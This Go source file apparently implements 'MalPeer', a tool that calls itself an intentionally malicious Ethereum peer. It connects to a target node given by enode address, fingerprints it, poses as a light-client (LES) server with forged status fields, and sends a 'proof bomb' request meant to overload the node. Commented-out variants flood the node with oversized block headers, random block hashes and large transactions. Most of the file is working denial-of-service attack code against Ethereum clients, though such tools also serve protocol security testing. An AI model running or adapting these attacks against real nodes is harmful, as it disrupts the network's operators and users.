package main

import (
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth"
	"github.com/ethereum/go-ethereum/les"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"sync"

	"gopkg.in/urfave/cli.v1"
	"math/big"
	"os"
	"strings"
	"time"
)

var (
	lesServerFlag = cli.StringFlag{
		Name:  "srv",
		Usage: "adress of enode to attack",
	}
	app = cli.NewApp()
)

func init() {
	app.Name = "MalPeer"
	app.Usage = "Intentionally malicious ethereum peer"
	app.Flags = []cli.Flag{
		lesServerFlag,
	}
	app.Action = malPeer
	app.Commands = []cli.Command{}
}
func main() {
	if err := app.Run(os.Args); err != nil {
		log.Error("exit with error", "err", err)
		os.Exit(1)
	}
}

type protorunner interface {
	protocols() []p2p.Protocol
	waitForCompletion()
}
type dataCollector struct {
	ethStatus *statusData
	lesStatus *keyValueMap
	info      *p2p.PeerInfo
	wg        sync.WaitGroup
}

func startup(node *enode.Node, runner protorunner) error {
	srv, err := createServer()
	if err != nil {
		return err
	}
	//// Gather the protocols and start the freshly assembled P2P server
	srv.Protocols = runner.protocols()
	log.Info("Starting server")
	if err := srv.Start(); err != nil {
		return err
	}
	log.Info("Adding peer")
	srv.AddPeer(node)
	// wait for the protocols to connect and add themselves to the waitgroup
	time.Sleep(1 * time.Second)
	runner.waitForCompletion()
	srv.Stop()
	return nil
}

func malPeer(c *cli.Context) error {
	log.Root().SetHandler(log.LvlFilterHandler(log.Lvl(5), log.StreamHandler(os.Stdout, log.TerminalFormat(true))))
	url := c.GlobalString(lesServerFlag.Name)
	// Try to add the url as a static peer and return
	node, err := enode.ParseV4(url)
	if err != nil {
		return fmt.Errorf("invalid enode: %v (url %v)", err, url)
	}
	log.Info("Fingerprinting targets")
	dc := newDataCollector()
	err = startup(node, dc)
	if err != nil {
		log.Error("fingerprinting failed", "error", err)
		return err
	}
	log.Info("Fingerprinting done")
	dc.printInfo()
	a := newAttacker(dc)
	for protos := a.next(); protos != nil; protos = a.next(){
		srv, _ := createServer()
		srv.Protocols = protos
		log.Info("Starting server")
		if err := srv.Start(); err != nil {
			return err
		}
		srv.AddPeer(node)
		time.Sleep(2 * time.Second)
		a.waitForCompletion()
		srv.Stop()
	}

	return nil
}

func createServer() (*p2p.Server, error) {
	serverConfig := p2p.Config{}
	pkey, err := crypto.HexToECDSA("1337000013370000133700001337000013370000133700001337000013370000")
	if err != nil {
		return nil, err
	}
	serverConfig.PrivateKey = pkey
	serverConfig.Logger = log.New()
	serverConfig.Name = "malpeer 0.1"
	//serverConfig.Name = veryLargeString(10)
	srv := &p2p.Server{Config: serverConfig}
	srv.Logger.Info("Starting peer-to-peer node", "instance", serverConfig.Name)
	return srv, nil
}

//func handleBlockHeadersMsg(msg p2p.Msg, rw p2p.MsgReadWriter) error {
//	request := &getBlockHeadersData{}
//	err := msg.Decode(request)
//	if err != nil {
//		return err
//	}
//	log.Info("Remote peer requested block headers",
//		"origin", request.Origin,
//		"amount", request.Amount,
//		"skip", request.Skip,
//		"reverse", request.Reverse)
//	return nil
//
//}

func lesSendLargeAnnounceMessage(rw p2p.MsgReadWriter) error {
	var announcement = largeLesAccouncement()
	err := p2p.Send(rw, les.AnnounceMsg, *announcement)
	return err
}

func lesRequestProofV2Bomb(rw p2p.MsgReadWriter, remoteBlockHash common.Hash) error {
	log.Info("Sending V2 proof bomb")
	return p2p.Send(rw, les.GetProofsV2Msg, lessV2ProofBomb(remoteBlockHash))
}

//func sendEthAnnounceMessage(rw p2p.MsgReadWriter) error {
//	//newData := largeNewBlockData()
//	newData := randomNewBlockData()
//	err := p2p.Send(rw, eth.NewBlockMsg, newData)
//	return err
//}

//func ethSendRandomBlockHashes(rw p2p.MsgReadWriter) error {
//	data := randomBlockHashes(100)
//	err := p2p.Send(rw, eth.NewBlockHashesMsg, data)
//	return err
//}

//func ethSendLargeBlockHeaders(rw p2p.MsgReadWriter) error {
//	data := []*types.Header{largeHeader(), largeHeader()}
//	err := p2p.Send(rw, eth.BlockHeadersMsg, data)
//	return err
//}

//func ethSendManyTransactions(rw p2p.MsgReadWriter) error {
//
//	err := p2p.Send(rw, eth.TxMsg, largeTxs())
//	return err
//}

func mirrorLesStatusMessage(msg p2p.Msg, rw p2p.MsgReadWriter) error {
	var remoteStatus keyValueList

	log.Info("Mirroring ethStatus")
	//fmt.Printf("remote ethStatus %v", remoteStatus)
	//remoteStatus.add("announceType", 3)
	err := p2p.Send(rw, les.StatusMsg, remoteStatus)
	return err
}
func beServerLesStatusMessage(msg p2p.Msg, rw p2p.MsgReadWriter) (common.Hash, error) {
	var status keyValueList
	msg.Decode(&status)
	// use the same network, genesis etc as remote, but also set server fields

	fmt.Printf("remote ethStatus\n %v\n", status)
	//var ethStatus keyValueList
	status = status.add("serveChainSince", uint64(0))
	status = status.add("serveStateSince", uint64(0))
	status = status.add("txRelay", true)
	status = status.add("flowControl/BL", uint64(1337))
	status = status.add("flowControl/MRR", uint64(1338))
	status = status.add("flowControl/MRC", testCostList())

	fmt.Printf("our ethStatus:\n%v\n", status)

	kvm, _ := status.decode()
	var remoteBlockHash common.Hash
	kvm.get("headHash", &remoteBlockHash)

	err := p2p.Send(rw, les.StatusMsg, status)
	return remoteBlockHash, err
}

func handleStatusMessage(msg p2p.Msg, rw p2p.MsgReadWriter) error {
	remoteStatus := &statusData{}
	msg.Decode(remoteStatus)
	log.Info("Mirroring ethStatus",
		"cb", remoteStatus.CurrentBlock,
		"genesis", remoteStatus.GenesisBlock,
		"network", remoteStatus.NetworkId)
	err := p2p.Send(rw, eth.StatusMsg, &statusData{
		ProtocolVersion: remoteStatus.ProtocolVersion,
		NetworkId:       remoteStatus.NetworkId,
		TD:              big.NewInt(500),
		CurrentBlock:    remoteStatus.CurrentBlock,
		GenesisBlock:    remoteStatus.GenesisBlock,
	})
	return err
}

func lesSendRequest(w p2p.MsgWriter, msgcode, reqID uint64, data interface{}) error {
	type req struct {
		ReqID uint64
		Data  interface{}
	}
	return p2p.Send(w, msgcode, req{reqID, data})
}

// RequestCode fetches a batch of arbitrary data from a node's known state
// data, corresponding to the specified hashes.
func RequestCode(reqID uint64, reqs []les.CodeReq, rw p2p.MsgReadWriter) error {
	return lesSendRequest(rw, les.GetCodeMsg, reqID, reqs)
}
func onPeer(peer *p2p.Peer) {
	info := peer.Info()
	var protos []string
	for k, v := range info.Protocols {
		protos = append(protos, fmt.Sprintf("%v: %v", k, v))
	}
	log.Info("Got peer", "name", info.Name, "id", info.ID, "network", info.Network, "protocols", strings.Join(protos, ";"))

}

func lesPeerRun(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	fmt.Printf("Hey, running LES peer\n")
	onPeer(peer)
	errc := make(chan error, 1)

	go func() {
		msg, err := rw.ReadMsg()
		log.Info("les read message", "message", msg, "error", err)
		if err != nil {
			errc <- err
			return
		}
		log.Info("les msg", "code", msg.Code, "size", msg.Size)
		var remoteBlockHash common.Hash
		if msg.Code == les.StatusMsg {

			if remoteBlockHash, err = beServerLesStatusMessage(msg, rw); err != nil {
				errc <- err
				return
			}
		}
		//err = lesSendLargeAnnounceMessage(rw)
		//if err != nil {
		//	errc <- err
		//}
		err = lesRequestProofV2Bomb(rw, remoteBlockHash)
		if err != nil {
			errc <- err
		}
		//RequestCode(1337, []les.CodeReq{}, rw)
		time.Sleep(10 * time.Second)
	}()

	select {
	case err := <-errc:
		log.Info("Got error", "error", err)
		return err
	case <-time.After(20 * time.Second):
		fmt.Println("timeout 1")
	}

	log.Info("LES peer runner exiting")
	return nil

}

//func ethPeerLargeBlockHeadersAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
//	onPeer(peer)
//	errc := make(chan error, 1)
//	go func() {
//		msg, err := rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if err != nil {
//			errc <- err
//			return
//		}
//		log.Info("msg", "code", msg.Code, "size", msg.Size)
//		if msg.Code == eth.StatusMsg {
//			if err = handleStatusMessage(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		msg, err = rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if msg.Code == eth.GetBlockHeadersMsg {
//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		log.Info("Sending gigantic block headers")
//		err = ethSendLargeBlockHeaders(rw)
//
//	}()
//
//	select {
//	case err := <-errc:
//		log.Info("Got error", "error", err)
//		return err
//	case <-time.After(20 * time.Second):
//		fmt.Println("timeout 1")
//	}
//	log.Info("peer runner exiting")
//	return nil
//}

//func ethPeerLargeBlockHashesAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
//	onPeer(peer)
//	errc := make(chan error, 1)
//	go func() {
//		msg, err := rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if err != nil {
//			errc <- err
//			return
//		}
//		log.Info("msg", "code", msg.Code, "size", msg.Size)
//		if msg.Code == eth.StatusMsg {
//			if err = handleStatusMessage(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		msg, err = rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if msg.Code == eth.GetBlockHeadersMsg {
//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		log.Info("Sending lots of  block hashes")
//		for i := 0; i < 100; i++ {
//			err = ethSendRandomBlockHashes(rw)
//		}
//	}()
//
//	select {
//	case err := <-errc:
//		log.Info("Got error", "error", err)
//		return err
//	case <-time.After(20 * time.Second):
//		fmt.Println("timeout 1")
//	}
//	log.Info("peer runner exiting")
//	return nil
//}
//func ethPeerLargeTransactionsAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
//	onPeer(peer)
//	errc := make(chan error, 1)
//	go func() {
//		msg, err := rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if err != nil {
//			errc <- err
//			return
//		}
//		log.Info("msg", "code", msg.Code, "size", msg.Size)
//		if msg.Code == eth.StatusMsg {
//			if err = handleStatusMessage(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		msg, err = rw.ReadMsg()
//		log.Info("read message", "message", msg, "error", err)
//		if msg.Code == eth.GetBlockHeadersMsg {
//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
//				errc <- err
//				return
//			}
//		}
//		log.Info("Sending lots of  large transactions")
//		for i := 0; i < 100; i++ {
//			err = ethSendManyTransactions(rw)
//		}
//	}()
//
//	select {
//	case err := <-errc:
//		log.Info("Got error", "error", err)
//		return err
//	case <-time.After(20 * time.Second):
//		fmt.Println("timeout 1")
//	}
//	log.Info("peer runner exiting")
//	return nil
//}
